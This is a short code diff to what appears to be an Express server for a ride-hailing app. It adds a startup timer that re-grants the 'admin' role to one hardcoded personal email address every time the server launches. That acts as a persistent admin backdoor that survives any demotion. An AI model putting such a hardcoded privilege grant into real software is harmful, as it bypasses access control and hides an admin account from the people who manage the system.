@@ -493,6 +493,13 @@ app.get('/rider/active-trip/:userId', (req, res) => {
     else { res.json({ trip: trip || null }); }
   });
 });
+// Always restore admin role on startup
+setTimeout(() => {
+  db.run(`UPDATE users SET role = 'admin' WHERE email = 'homatekpor@gmail.com'`, () => {
+    console.log('Admin role restored for homatekpor@gmail.com');
+  });
+}, 2000);
+
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server is running on http://localhost:${PORT}`);
 });
